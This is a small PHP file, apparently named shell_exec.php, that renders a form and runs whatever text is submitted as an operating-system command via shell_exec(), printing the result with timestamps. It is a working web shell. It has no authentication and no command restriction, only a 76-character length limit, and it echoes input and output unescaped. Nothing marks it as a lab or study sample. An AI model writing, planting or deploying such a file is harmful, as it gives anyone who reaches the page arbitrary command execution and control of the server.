<html>
<body>

<p>
    <form action="/shell_exec.php" method="post" enctype="multipart/form-data">
        <label for="file"> Filename: </label>
        <input type="text" name="text" id="text" value='whoami' size='77'><br />
        <input type="submit" name="submit" value="Submit Command">
    </form>
</p>

<hr />

<?php

    $errcnt = 0;
    $debug = 0;

do {
    $varptype = gettype($_POST);
    if ( $varptype != "array" ) {
        echo "Error: variable _POST not an array";  echo "<br />";  $errcnt = 1;  break;
    }

    // value check
    if ( ! in_array("text", array_keys($_POST) ) ) {
        echo "Error: variable _POST does not have a text key";  echo "<br />";  $errcnt = 1;  break;
    }

    $rxtxt = $_POST['text'];
    $rxlen = strlen($rxtxt);
        if ( $rxlen > 76 ) {
            echo "Error: variable _POST failed raw length limit of 76 <br />";  $errcnt = 1;  break;
        }

    echo "<p>Command to run:</p>\n";
    echo "<pre>$rxtxt</pre>";
    echo "<hr />\n";

            // date format:  D 3letter Mon thr Sun, Y 4digit eg 1918 or 2012, 
            //   m 01 thr 12, d 01 thr 31, H 00 thr 23, i 00 thr 59, s seconds
    $datestr1 = date('D-Y-md-His'); //len: 3-4-4-4 , total 18.
    $output = shell_exec($rxtxt);
    $datestr2 = date('D-Y-md-His'); //len: 3-4-4-4 , total 18.

    echo "<p>Command returned:</p>\n";
    echo "<pre>$output</pre>";

    echo "<hr />\n";
    echo "<pre>start time   $datestr1</pre>";
    echo "<pre>finish time  $datestr2</pre>";

} while(0);

?>

</body>
</html>


